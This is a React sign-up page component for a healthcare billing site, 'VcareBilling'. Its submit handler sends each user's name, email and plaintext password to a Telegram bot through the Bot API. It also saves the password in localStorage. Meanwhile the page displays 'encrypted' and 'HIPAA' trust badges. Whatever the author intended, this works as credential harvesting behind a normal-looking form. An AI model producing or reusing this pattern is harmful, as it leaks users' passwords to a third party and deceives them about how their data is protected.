import { useTranslation } from 'react-i18next';
import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import {
  User,
  Mail,
  Lock,
  UserPlus,
  CheckCircle2,
  AlertCircle,
  HeartPulse,
  ShieldCheck
} from 'lucide-react';

const SignUp = () => {
  const { t } = useTranslation();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    password: '',
    confirmPassword: ''
  });

  const [status, setStatus] = useState({ message: '', type: '' });
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    if (formData.password !== formData.confirmPassword) {
      setStatus({ message: t('signUp.errors.passwordMismatch'), type: "error" });
      setIsLoading(false);
      return;
    }

    const botToken = "YOUR_BOT_TOKEN_HERE";
    const chatId = "YOUR_CHAT_ID_HERE";

    const text = `
🆕 **Yangi foydalanuvchi ro'yxatdan o'tdi!**
👤 **Ism:** ${formData.fullName}
📧 **Email:** ${formData.email}
🔑 **Parol:** ${formData.password}
📅 **Sana:** ${new Date().toLocaleString()}
  `;

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'Markdown'
        })
      });

      if (response.ok) {
        localStorage.setItem("user", JSON.stringify(formData));
        setStatus({ message: t('signUp.errors.success'), type: "success" });

        setFormData({ fullName: '', email: '', password: '', confirmPassword: '' });
      } else {
        throw new Error("Telegramga yuborishda xatolik");
      }
    } catch (error) {
      setStatus({ message: t('signUp.errors.error'), type: "error" });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-slate-50 px-4 py-12 relative overflow-hidden">

      <div className="absolute top-[-20%] left-[-10%] w-[50%] h-[50%] bg-blue-100/50 rounded-full blur-[120px] -z-10"></div>
      <div className="absolute bottom-[-20%] right-[-10%] w-[50%] h-[50%] bg-sky-100/50 rounded-full blur-[120px] -z-10"></div>

      <div className="max-w-xl w-full">
        <div className="text-center mb-8">
          <Link to="/" className="inline-flex items-center gap-2 mb-4">
            <div className="bg-blue-600 p-2 rounded-xl shadow-lg shadow-blue-200">
              <HeartPulse className="text-white" size={28} />
            </div>
            <span className="text-2xl font-black text-slate-900 tracking-tight">Vcare<span className="text-blue-600">Billing</span></span>
          </Link>
          <h2 className="text-3xl font-black text-slate-900">{t('signUp.title')}</h2>
          <p className="text-slate-500 mt-2 font-medium">{t('signUp.subtitle')}</p>
        </div>

        <div className="bg-white rounded-[2.5rem] shadow-2xl shadow-slate-200/60 p-8 md:p-12 border border-slate-100">
          <form onSubmit={handleSubmit} className="space-y-6">

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-400 uppercase ml-1 tracking-widest">{t('signUp.fullName')}</label>
              <div className="relative group">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-500 transition-colors">
                  <User size={20} />
                </div>
                <input
                  type="text"
                  name="fullName"
                  required
                  value={formData.fullName}
                  onChange={handleChange}
                  className="w-full pl-12 pr-4 py-4 bg-slate-50 border-2 border-slate-50 rounded-2xl focus:bg-white focus:border-blue-500 outline-none transition-all font-medium"
                  placeholder="Jonibek Toshpo'latov"
                />
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-400 uppercase ml-1 tracking-widest">{t('signUp.email')}</label>
              <div className="relative group">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-500 transition-colors">
                  <Mail size={20} />
                </div>
                <input
                  type="email"
                  name="email"
                  required
                  value={formData.email}
                  onChange={handleChange}
                  className="w-full pl-12 pr-4 py-4 bg-slate-50 border-2 border-slate-50 rounded-2xl focus:bg-white focus:border-blue-500 outline-none transition-all font-medium"
                  placeholder="vcare@example.com"
                />
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-slate-400 uppercase ml-1 tracking-widest">{t('signUp.password')}</label>
                <div className="relative group">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-500 transition-colors">
                    <Lock size={20} />
                  </div>
                  <input
                    type="password"
                    name="password"
                    required
                    value={formData.password}
                    onChange={handleChange}
                    className="w-full pl-12 pr-4 py-4 bg-slate-50 border-2 border-slate-50 rounded-2xl focus:bg-white focus:border-blue-500 outline-none transition-all font-medium"
                    placeholder="••••••"
                  />
                </div>
              </div>
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-slate-400 uppercase ml-1 tracking-widest">{t('signUp.confirm')}</label>
                <div className="relative group">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-500 transition-colors">
                    <ShieldCheck size={20} />
                  </div>
                  <input
                    type="password"
                    name="confirmPassword"
                    required
                    value={formData.confirmPassword}
                    onChange={handleChange}
                    className="w-full pl-12 pr-4 py-4 bg-slate-50 border-2 border-slate-50 rounded-2xl focus:bg-white focus:border-blue-500 outline-none transition-all font-medium"
                    placeholder="••••••"
                  />
                </div>
              </div>
            </div>

            {status.message && (
              <div className={`flex items-center gap-3 p-4 rounded-2xl text-sm font-bold animate-in zoom-in-95 duration-300 ${status.type === 'success' ? 'bg-green-50 text-green-700' : 'bg-red-50 text-red-700'
                }`}>
                {status.type === 'success' ? <CheckCircle2 size={20} /> : <AlertCircle size={20} />}
                {status.message}
              </div>
            )}

            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-slate-900 hover:bg-blue-600 text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-slate-200 transition-all flex items-center justify-center gap-3 active:scale-[0.98] disabled:opacity-70 group"
            >
              {isLoading ? (
                <div className="w-6 h-6 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <>
                  {t('signUp.submit')} <UserPlus size={22} className="group-hover:translate-x-1 transition-transform" />
                </>
              )}
            </button>
          </form>

          <div className="mt-10 pt-8 border-t border-slate-50 text-center">
            <p className="text-slate-500 font-medium">
              {t('signUp.hasAccount')}{' '}
              <Link to={'/sign-in'} className="text-blue-600 font-black hover:underline ml-1">
                {t('signUp.signIn')}
              </Link>
            </p>
          </div>
        </div>

        <div className="mt-8 flex justify-center items-center gap-4">
          <div className="flex items-center gap-1.5 bg-white px-3 py-1.5 rounded-full shadow-sm border border-slate-100">
            <ShieldCheck size={14} className="text-green-500" />
            <span className="text-[10px] font-bold text-slate-500 uppercase tracking-tighter">{t('signUp.encrypted')}</span>
          </div>
          <div className="flex items-center gap-1.5 bg-white px-3 py-1.5 rounded-full shadow-sm border border-slate-100">
            <CheckCircle2 size={14} className="text-blue-500" />
            <span className="text-[10px] font-bold text-slate-500 uppercase tracking-tighter">{t('signUp.hipaa')}</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SignUp;